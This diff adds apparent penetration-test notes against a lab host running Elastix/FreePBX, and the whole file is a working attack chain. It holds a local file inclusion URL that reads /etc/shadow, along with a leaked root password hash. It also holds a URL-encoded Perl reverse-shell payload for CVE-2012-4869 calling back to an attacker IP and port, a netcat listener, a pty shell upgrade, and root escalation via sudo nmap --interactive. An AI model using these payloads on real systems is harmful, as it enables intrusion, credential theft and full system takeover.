@@ -1,0 +1,20 @@
+Elastix 2.2.0 - 'graph.php' Local File Inclusion - https://www.exploit-db.com/exploits/37637
+
+https://10.11.1.217/vtigercrm/graph.php?current_language=../../../../../../../../etc/shadow%00&module=Accounts&action
+
+root:$1$uF5XC.Im$8k0Gkw4wYaZkNzuOuySIx/:16902:0:99999:7::
+
+
+FreePBX 2.10.0 / Elastix 2.2.0 - Remote Code Execution CVE-2012-4869 - https://www.exploit-db.com/exploits/18650
+
+nc-lnvp PORT
+
+https://10.11.1.217/recordings/misc/callme_page.php?action=c&callmenum=1000@from-internal/n%0D%0AApplication:%20system%0D%0AData:%20perl%20-MIO%20-e%20%27%24p%3dfork%3bexit%2cif(%24p)%3b%24c%3dnew%20IO%3a%3aSocket%3a%3aINET(PeerAddr%2c%22IP%3aPORT%22)%3bSTDIN-%3Efdopen(%24c%2cr)%3b%24~-%3Efdopen(%24c%2cw)%3bsystem%24_%20while%3C%3E%3b%27%0D%0A%0D%0A
+
+python -c 'import pty; pty.spawn("/bin/bash")'
+
+sudo -l
+
+(root) NOPASSWD: /usr/bin/nmap
+sudo nmap --interactive
+!sh
